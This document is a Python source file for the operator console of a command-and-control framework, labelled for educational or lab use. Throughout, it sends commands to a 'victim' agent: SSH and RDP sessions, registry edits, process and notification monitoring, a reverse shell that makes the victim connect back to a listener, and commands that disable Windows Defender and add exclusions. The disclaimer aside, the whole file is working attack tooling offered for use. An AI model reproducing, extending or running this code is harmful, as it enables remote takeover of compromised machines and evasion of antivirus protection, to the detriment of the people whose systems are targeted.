"""
C2 Operator CLI — interactive shell for controlling the C2 server.

Push alerts from the victim arrive asynchronously and are printed
immediately, regardless of what the operator is typing.

Usage:
    python client.py --host 127.0.0.1 --port 4444 --token changeme

For educational/lab use only.
"""

import argparse
import json
import queue
import readline  # noqa: F401 — enables arrow-key history
import socket
import ssl
import sys
import textwrap
import threading
import time


# ──────────────────────────────────────────────────────────────────────
# ANSI colour helpers
# ──────────────────────────────────────────────────────────────────────
RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
GREEN  = "\033[92m"
MAGENTA= "\033[95m"

def _c(colour: str, text: str) -> str:
    return f"{colour}{text}{RESET}"


# ──────────────────────────────────────────────────────────────────────
# Alert renderer
# ──────────────────────────────────────────────────────────────────────

ALERT_ICONS = {
    "notification": "🔔",
    "error":        "❌",
    "warning":      "⚠️ ",
    "info":         "ℹ️ ",
}

def print_alert(data: dict):
    """
    Print a push event from the agent in a visually distinct block
    that doesn't corrupt the current input line.
    """
    event     = data.get("event", "event")
    title     = data.get("title", "")
    body      = data.get("body", "")
    win_class = data.get("win_class", "")
    timestamp = data.get("timestamp", "")
    icon      = ALERT_ICONS.get(event, "📨")

    border = _c(YELLOW, "─" * 60)
    # Move cursor to beginning of line, clear it, print alert, then reprint
    # the prompt so readline state is preserved.
    sys.stdout.write(f"\r{border}\n")
    sys.stdout.write(
        f" {icon}  {_c(BOLD + YELLOW, 'VICTIM NOTIFICATION')}  "
        f"{_c(CYAN, timestamp)}\n"
    )
    if title:
        sys.stdout.write(f"   {_c(BOLD, 'Title:')     } {title}\n")
    if body:
        # Wrap long body text
        for line in textwrap.wrap(body, width=55):
            sys.stdout.write(f"   {_c(BOLD, 'Body: ')     } {line}\n")
    if win_class:
        sys.stdout.write(f"   {_c(BOLD, 'WinClass:')  } {_c(MAGENTA, win_class)}\n")
    sys.stdout.write(f"{border}\n")
    sys.stdout.write("c2> ")   # reprint the prompt
    sys.stdout.flush()


# ──────────────────────────────────────────────────────────────────────
# Low-level transport — split recv into background thread
# ──────────────────────────────────────────────────────────────────────

class C2Client:
    def __init__(self, host: str, port: int, token: str,
                 use_tls: bool = False, ca_cert: str | None = None):
        self.host     = host
        self.port     = port
        self.token    = token
        self._sock: socket.socket | None = None
        self._buf     = b""
        self._use_tls = use_tls
        self._ca_cert = ca_cert

        # Responses to operator commands land here
        self._resp_q: queue.Queue[dict] = queue.Queue()
        # Background receiver thread
        self._recv_thread: threading.Thread | None = None
        self._alive = True
        self._send_lock = threading.Lock()

    # ------------------------------------------------------------------
    def connect(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(60)
        if self._use_tls:
            ctx = ssl.create_default_context()
            if self._ca_cert:
                ctx.load_verify_locations(self._ca_cert)
            else:
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
            self._sock = ctx.wrap_socket(raw, server_hostname=self.host)
        else:
            self._sock = raw
        self._sock.connect((self.host, self.port))

        # Start background receiver immediately after connecting
        self._recv_thread = threading.Thread(
            target=self._receiver, daemon=True, name="c2-receiver"
        )
        self._recv_thread.start()

    def authenticate(self) -> dict:
        """Send operator auth (no role field → server defaults to 'operator')."""
        return self._send_recv({"token": self.token})

    def send(self, module: str, payload: dict) -> dict:
        return self._send_recv({"module": module, "payload": payload})

    def close(self):
        self._alive = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    # ------------------------------------------------------------------
    # Background receiver — classifies every incoming line:
    #   • {"event": ...}  → push alert, print immediately
    #   • anything else   → command response, put in queue
    # ------------------------------------------------------------------
    def _receiver(self):
        buf = b""
        while self._alive:
            try:
                chunk = self._sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    try:
                        data = json.loads(line.decode("utf-8"))
                    except json.JSONDecodeError:
                        continue

                    if "event" in data:
                        # ── Push event from agent ─────────────────────
                        print_alert(data)
                    else:
                        # ── Response to a command ─────────────────────
                        self._resp_q.put(data)
            except (OSError, socket.timeout):
                break
        self._alive = False
        # Unblock any waiting send_recv
        self._resp_q.put({"status": "error", "message": "Connection lost"})

    # ------------------------------------------------------------------
    def _send_raw(self, data: dict):
        raw = (json.dumps(data) + "\n").encode()
        with self._send_lock:
            self._sock.sendall(raw)

    def _send_recv(self, data: dict) -> dict:
        self._send_raw(data)
        try:
            return self._resp_q.get(timeout=30)
        except queue.Empty:
            return {"status": "error", "message": "Timeout waiting for response"}


# ──────────────────────────────────────────────────────────────────────
# Interactive shell helpers
# ──────────────────────────────────────────────────────────────────────

BANNER = r"""
  ██████╗██████╗      ██████╗ ██████╗ ███████╗
 ██╔════╝╚════██╗    ██╔═══██╗██╔══██╗██╔════╝
 ██║      █████╔╝    ██║   ██║██████╔╝███████╗
 ██║     ██╔═══╝     ██║   ██║██╔═══╝ ╚════██║
 ╚██████╗███████╗    ╚██████╔╝██║     ███████║
  ╚═════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝
  Educational C2 Operator Console — lab use only
"""

HELP_TEXT = textwrap.dedent("""
Commands:
  help                          Show this help
  quit / exit                   Disconnect and exit

  --- SSH ---
  ssh connect <host> <user> [port] [password]
  ssh exec    <session_id> <command>
  ssh list
  ssh disconnect <session_id>

  --- RDP ---
  rdp probe <host> [port]
  rdp open  <host> <user> [port] [password]
  rdp list
  rdp close <session_id>

  --- Registry (Windows agent only) ---
  reg list_keys    <hive> <key_path>
  reg list_values  <hive> <key_path>
  reg read         <hive> <key_path> <value_name>
  reg write        <hive> <key_path> <value_name> <value_data> [type]
  reg delete_value <hive> <key_path> <value_name>
  reg create_key   <hive> <key_path>
  reg delete_key   <hive> <key_path>

  --- Activity Monitor ---
  act processes  [name_filter]
  act stats
  act network
  act top_cpu    [limit]
  act top_mem    [limit]
  act monitor start [interval_seconds]
  act monitor stop
  act monitor get   [last_n_snapshots]

  --- Notification Monitor (real-time push) ---
  notify start                           Start intercepting victim system notifications
  notify stop                            Stop the notification monitor
  notify status                          Check if monitor is running
  notify popup  <title> <body> [type]    Send a modal MessageBox popup to the victim
  notify balloon <title> <body> [type] [ms]  Send a system-tray balloon tip to the victim
    type = info (default) | warning | error
    ms   = balloon display time in ms    (default 6000)

  --- Reverse Shell ---
  shell <my_ip> [port=4445] [cmd.exe|powershell.exe]
                                Open reverse shell (Ctrl+] to detach)
  shell stop / shell status

  --- Windows Defender ---
  defender status               Check service state, tamper protection, exclusions
  defender disable              Disable Defender (5 layered methods, ~20 s, needs admin)
  defender enable               Re-enable Defender and restore services
  defender exclude path <path>  Add a path exclusion
  defender exclude process <exe> Add a process exclusion
  defender exclude ext <.ext>   Add a file-extension exclusion
  defender unexclude path/process/ext <value>
  defender exclusions           List all current exclusions

  --- Raw JSON (advanced) ---
  raw <module> <json_payload>
""")


def pprint(data: dict):
    print(json.dumps(data, indent=2, default=str))


# ──────────────────────────────────────────────────────────────────────
# Command parsers
# ──────────────────────────────────────────────────────────────────────

def parse_ssh(parts: list[str], client: C2Client):
    if not parts:
        print("Usage: ssh <connect|exec|list|disconnect> ...")
        return
    action = parts[0]
    if action == "connect":
        if len(parts) < 3:
            print("Usage: ssh connect <host> <user> [port] [password]")
            return
        host, username = parts[1], parts[2]
        port     = int(parts[3]) if len(parts) > 3 else 22
        password = parts[4]       if len(parts) > 4 else None
        payload  = {"action": "connect", "host": host, "port": port,
                    "username": username, "session_id": f"{host}:{port}"}
        if password: payload["password"] = password
        pprint(client.send("ssh", payload))
    elif action == "exec":
        if len(parts) < 3:
            print("Usage: ssh exec <session_id> <command ...>")
            return
        pprint(client.send("ssh", {"action": "exec",
                                   "session_id": parts[1],
                                   "command": " ".join(parts[2:])}))
    elif action == "list":
        pprint(client.send("ssh", {"action": "list"}))
    elif action == "disconnect":
        if len(parts) < 2:
            print("Usage: ssh disconnect <session_id>")
            return
        pprint(client.send("ssh", {"action": "disconnect", "session_id": parts[1]}))
    else:
        print(f"Unknown ssh action: {action!r}")


def parse_rdp(parts: list[str], client: C2Client):
    if not parts:
        print("Usage: rdp <probe|open|close|list> ...")
        return
    action = parts[0]
    if action == "probe":
        if len(parts) < 2:
            print("Usage: rdp probe <host> [port]")
            return
        host = parts[1]
        port = int(parts[2]) if len(parts) > 2 else 3389
        pprint(client.send("rdp", {"action": "probe", "host": host, "port": port}))
    elif action == "open":
        if len(parts) < 3:
            print("Usage: rdp open <host> <user> [port] [password]")
            return
        host, username = parts[1], parts[2]
        port     = int(parts[3]) if len(parts) > 3 else 3389
        password = parts[4]       if len(parts) > 4 else ""
        pprint(client.send("rdp", {
            "action": "open", "host": host, "port": port,
            "username": username, "password": password,
            "session_id": f"rdp-{host}:{port}",
        }))
    elif action == "list":
        pprint(client.send("rdp", {"action": "list"}))
    elif action == "close":
        if len(parts) < 2:
            print("Usage: rdp close <session_id>")
            return
        pprint(client.send("rdp", {"action": "close", "session_id": parts[1]}))
    else:
        print(f"Unknown rdp action: {action!r}")


def parse_reg(parts: list[str], client: C2Client):
    if not parts:
        print("Usage: reg <action> ...")
        return
    action = parts[0]
    if action in ("list_keys", "list_values"):
        pprint(client.send("registry", {
            "action": action, "hive": parts[1], "key_path": parts[2],
        }))
    elif action == "read":
        pprint(client.send("registry", {
            "action": "read_value", "hive": parts[1],
            "key_path": parts[2], "value_name": parts[3] if len(parts) > 3 else "",
        }))
    elif action == "write":
        pprint(client.send("registry", {
            "action": "write_value", "hive": parts[1],
            "key_path": parts[2], "value_name": parts[3] if len(parts) > 3 else "",
            "value_data": parts[4] if len(parts) > 4 else "",
            "value_type": parts[5] if len(parts) > 5 else "REG_SZ",
        }))
    elif action == "delete_value":
        pprint(client.send("registry", {
            "action": "delete_value", "hive": parts[1],
            "key_path": parts[2], "value_name": parts[3],
        }))
    elif action == "create_key":
        pprint(client.send("registry", {
            "action": "create_key", "hive": parts[1], "key_path": parts[2],
        }))
    elif action == "delete_key":
        pprint(client.send("registry", {
            "action": "delete_key", "hive": parts[1], "key_path": parts[2],
        }))
    else:
        print(f"Unknown registry action: {action!r}")


def parse_act(parts: list[str], client: C2Client):
    if not parts:
        print("Usage: act <processes|stats|network|top_cpu|top_mem|monitor> ...")
        return
    action = parts[0]
    if action == "processes":
        payload = {"action": "processes"}
        if len(parts) > 1: payload["name"] = parts[1]
        pprint(client.send("activity", payload))
    elif action == "stats":
        pprint(client.send("activity", {"action": "system_stats"}))
    elif action == "network":
        pprint(client.send("activity", {"action": "network_connections"}))
    elif action == "top_cpu":
        pprint(client.send("activity", {"action": "top_cpu",
                                        "limit": int(parts[1]) if len(parts) > 1 else 10}))
    elif action == "top_mem":
        pprint(client.send("activity", {"action": "top_mem",
                                        "limit": int(parts[1]) if len(parts) > 1 else 10}))
    elif action == "monitor":
        sub = parts[1] if len(parts) > 1 else "get"
        if sub == "start":
            interval = int(parts[2]) if len(parts) > 2 else 5
            pprint(client.send("activity", {"action": "start_monitor", "interval": interval}))
        elif sub == "stop":
            pprint(client.send("activity", {"action": "stop_monitor"}))
        elif sub == "get":
            limit = int(parts[2]) if len(parts) > 2 else 5
            pprint(client.send("activity", {"action": "get_snapshots", "limit": limit}))
        else:
            print(f"Unknown monitor sub-command: {sub!r}")
    else:
        print(f"Unknown activity action: {action!r}")


def parse_notify(parts: list[str], client: C2Client):
    """
    notify start          — start intercepting victim notifications
    notify stop           — stop the monitor
    notify status         — check if running
    notify popup  <title> <body> [info|warning|error]
    notify balloon <title> <body> [info|warning|error] [timeout_ms]
    """
    action = parts[0] if parts else "status"

    if action in ("start", "stop", "status"):
        result = client.send("notify", {"action": action})
        pprint(result)
        if action == "start" and result.get("status") == "ok":
            print(_c(GREEN,
                "\n  Notification monitor is ON. "
                "Victim alerts will appear here in real-time.\n"))
        return

    if action == "popup":
        # notify popup <title> <body> [type]
        if len(parts) < 3:
            print("Usage: notify popup <title> <body> [info|warning|error]")
            return
        title = parts[1]
        body  = parts[2]
        typ   = parts[3] if len(parts) > 3 else "info"
        pprint(client.send("notify", {
            "action": "send_popup",
            "title":  title,
            "body":   body,
            "type":   typ,
        }))
        return

    if action == "balloon":
        # notify balloon <title> <body> [type] [timeout_ms]
        if len(parts) < 3:
            print("Usage: notify balloon <title> <body> [info|warning|error] [timeout_ms]")
            return
        title      = parts[1]
        body       = parts[2]
        typ        = parts[3] if len(parts) > 3 else "info"
        timeout_ms = int(parts[4]) if len(parts) > 4 else 6000
        pprint(client.send("notify", {
            "action":     "send_balloon",
            "title":      title,
            "body":       body,
            "type":       typ,
            "timeout_ms": timeout_ms,
        }))
        return

    print("Usage: notify <start | stop | status | popup | balloon>")


# ──────────────────────────────────────────────────────────────────────
# Reverse Shell
# ──────────────────────────────────────────────────────────────────────

def _shell_passthrough(sh_sock: socket.socket):
    """
    Raw bidirectional passthrough between the operator's terminal and the
    victim's shell socket.  Press Ctrl+] (ASCII 0x1d) to detach without
    killing the remote shell.
    """
    import select

    print(_c(YELLOW, "\n  ── SHELL MODE ── Ctrl+] to detach ──\n"))

    if sys.platform == "win32":
        # ── Windows operator ─────────────────────────────────────────
        import msvcrt
        sh_sock.setblocking(False)
        try:
            while True:
                # Drain incoming shell output
                try:
                    data = sh_sock.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except BlockingIOError:
                    pass
                except OSError:
                    break
                # Forward keystrokes
                if msvcrt.kbhit():
                    ch = msvcrt.getwch()
                    if ord(ch) == 0x1d:   # Ctrl+]
                        break
                    try:
                        sh_sock.sendall(ch.encode("utf-8", errors="replace"))
                    except OSError:
                        break
        except (OSError, KeyboardInterrupt):
            pass
    else:
        # ── Unix/macOS operator ──────────────────────────────────────
        import tty
        import termios
        old_settings = termios.tcgetattr(sys.stdin.fileno())
        tty.setraw(sys.stdin.fileno())
        try:
            while True:
                r, _, _ = select.select([sys.stdin, sh_sock], [], [], 0.2)
                if sys.stdin in r:
                    data = sys.stdin.buffer.read1(4096)
                    if b"\x1d" in data:       # Ctrl+] → detach
                        # Send everything before the escape, then exit
                        before = data[:data.index(b"\x1d")]
                        if before:
                            sh_sock.sendall(before)
                        break
                    try:
                        sh_sock.sendall(data)
                    except OSError:
                        break
                if sh_sock in r:
                    try:
                        data = sh_sock.recv(4096)
                        if not data:
                            break
                        sys.stdout.buffer.write(data)
                        sys.stdout.buffer.flush()
                    except OSError:
                        break
        except (OSError, KeyboardInterrupt):
            pass
        finally:
            termios.tcsetattr(sys.stdin.fileno(),
                              termios.TCSADRAIN, old_settings)

    print(_c(YELLOW, "\n\n  ── DETACHED from shell ──\n"))


def parse_shell(parts: list[str], client: C2Client):
    """
    shell <my_ip> [port=4445] [cmd.exe|powershell.exe]
        Open a reverse shell:
        1. Start a TCP listener on <my_ip>:<port>
        2. Tell the DLL agent to spawn cmd.exe and connect here
        3. Enter raw pass-through terminal mode
        Ctrl+] to detach (shell stays alive on victim)

    shell stop      Kill the running shell on the victim
    shell status    Check if a shell is running
    """
    if not parts or parts[0] in ("help", "--help"):
        print(textwrap.dedent(parse_shell.__doc__ or ""))
        return

    sub = parts[0]

    if sub == "stop":
        pprint(client.send("shell", {"action": "stop"}))
        return

    if sub == "status":
        pprint(client.send("shell", {"action": "status"}))
        return

    # Otherwise treat as: shell <lhost> [lport] [shell_exe]
    lhost     = sub
    lport     = int(parts[1]) if len(parts) > 1 else 4445
    shell_exe = parts[2]       if len(parts) > 2 else "cmd.exe"

    # ── Step 1: open listener ─────────────────────────────────────────
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", lport))
    except OSError as exc:
        print(f"[!] Cannot bind 0.0.0.0:{lport} — {exc}")
        return
    srv.listen(1)
    srv.settimeout(30)

    print(f"\n  Listener open on 0.0.0.0:{lport}")
    print(f"  Telling victim to connect back ({shell_exe}) …\n")

    # ── Step 2: tell DLL to connect back ─────────────────────────────
    resp = client.send("shell", {
        "action": "start",
        "lhost":  lhost,
        "lport":  lport,
        "shell":  shell_exe,
    })
    if resp.get("status") != "ok":
        print(f"[!] {resp.get('message')}")
        srv.close()
        return

    print(f"  {_c(GREEN, resp.get('message', 'Shell started'))}")
    print(f"  Waiting for shell connection (30 s timeout) …")

    # ── Step 3: accept the raw shell connection ───────────────────────
    try:
        sh_sock, sh_addr = srv.accept()
    except socket.timeout:
        print("[!] Timed out waiting for the shell to connect back.")
        srv.close()
        return
    finally:
        srv.close()   # stop accepting new connections

    print(f"  Shell connected from {sh_addr[0]}:{sh_addr[1]}")

    # ── Step 4: raw pass-through ──────────────────────────────────────
    sh_sock.settimeout(None)
    try:
        _shell_passthrough(sh_sock)
    finally:
        sh_sock.close()


# ──────────────────────────────────────────────────────────────────────
# Windows Defender
# ──────────────────────────────────────────────────────────────────────

def parse_defender(parts: list[str], client: C2Client):
    """Manage Windows Defender on the victim (requires admin on victim)."""
    action = parts[0] if parts else "status"

    if action == "status":
        pprint(client.send("defender", {"action": "status"}))

    elif action == "disable":
        print(_c(YELLOW, "  Disabling Defender (5 layered methods) — may take ~20 s …"))
        pprint(client.send("defender", {"action": "disable"}))

    elif action == "enable":
        print(_c(CYAN, "  Re-enabling Defender …"))
        pprint(client.send("defender", {"action": "enable"}))

    elif action in ("exclude", "add_exclusion"):
        # defender exclude path <p> | process <proc> | ext <.ext>
        if len(parts) < 3:
            print("Usage: defender exclude path <path>")
            print("       defender exclude process <exe>")
            print("       defender exclude ext <.ext>")
            return
        payload = {"action": "add_exclusion"}
        kind, value = parts[1], " ".join(parts[2:])
        if kind == "path":    payload["path"]      = value
        elif kind == "process": payload["process"] = value
        elif kind == "ext":   payload["extension"] = value
        else:
            print(f"Unknown exclusion type: {kind!r}. Use: path | process | ext")
            return
        pprint(client.send("defender", payload))

    elif action in ("unexclude", "remove_exclusion"):
        if len(parts) < 3:
            print("Usage: defender unexclude path <path>")
            print("       defender unexclude process <exe>")
            return
        payload = {"action": "remove_exclusion"}
        kind, value = parts[1], " ".join(parts[2:])
        if kind == "path":    payload["path"]      = value
        elif kind == "process": payload["process"] = value
        elif kind == "ext":   payload["extension"] = value
        else:
            print(f"Unknown exclusion type: {kind!r}")
            return
        pprint(client.send("defender", payload))

    elif action in ("exclusions", "list_exclusions"):
        pprint(client.send("defender", {"action": "list_exclusions"}))

    else:
        print(f"Unknown defender action: {action!r}")
        print("Usage: defender status | disable | enable | "
              "exclude <path|process|ext> <value> | "
              "unexclude <path|process|ext> <value> | exclusions")


# ──────────────────────────────────────────────────────────────────────
# REPL
# ──────────────────────────────────────────────────────────────────────

def repl(client: C2Client):
    print(BANNER)
    print(f"  Connected to {client.host}:{client.port}")
    print("  Type 'help' for available commands.\n")
    print(_c(CYAN,
        "  TIP: Run 'notify start' to receive live victim system alerts.\n"))

    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nExiting.")
            break

        if not line:
            continue

        parts = line.split()
        cmd   = parts[0].lower()

        if cmd in ("quit", "exit"):
            print("Bye.")
            break
        elif cmd == "help":
            print(HELP_TEXT)
        elif cmd == "ssh":
            parse_ssh(parts[1:], client)
        elif cmd == "rdp":
            parse_rdp(parts[1:], client)
        elif cmd == "reg":
            parse_reg(parts[1:], client)
        elif cmd == "act":
            parse_act(parts[1:], client)
        elif cmd == "notify":
            parse_notify(parts[1:], client)
        elif cmd == "shell":
            parse_shell(parts[1:], client)
        elif cmd == "defender":
            parse_defender(parts[1:], client)
        elif cmd == "raw":
            if len(parts) < 3:
                print("Usage: raw <module> <json_payload>")
                continue
            try:
                payload = json.loads(" ".join(parts[2:]))
            except json.JSONDecodeError as exc:
                print(f"JSON error: {exc}")
                continue
            pprint(client.send(parts[1], payload))
        else:
            print(f"Unknown command: {cmd!r}. Type 'help'.")


# ──────────────────────────────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(
        description="C2 Operator CLI — educational use only."
    )
    p.add_argument("--host",    default="127.0.0.1")
    p.add_argument("--port",    type=int, default=4444)
    p.add_argument("--token",   default="changeme")
    p.add_argument("--tls",     action="store_true")
    p.add_argument("--ca-cert", default=None)
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    client = C2Client(
        host    = args.host,
        port    = args.port,
        token   = args.token,
        use_tls = args.tls,
        ca_cert = args.ca_cert,
    )
    try:
        client.connect()
    except (ConnectionRefusedError, OSError) as exc:
        print(f"[!] Cannot connect to {args.host}:{args.port} — {exc}")
        sys.exit(1)

    resp = client.authenticate()
    if resp.get("status") != "ok":
        print(f"[!] Auth failed: {resp.get('message')}")
        sys.exit(1)

    try:
        repl(client)
    finally:
        client.close()
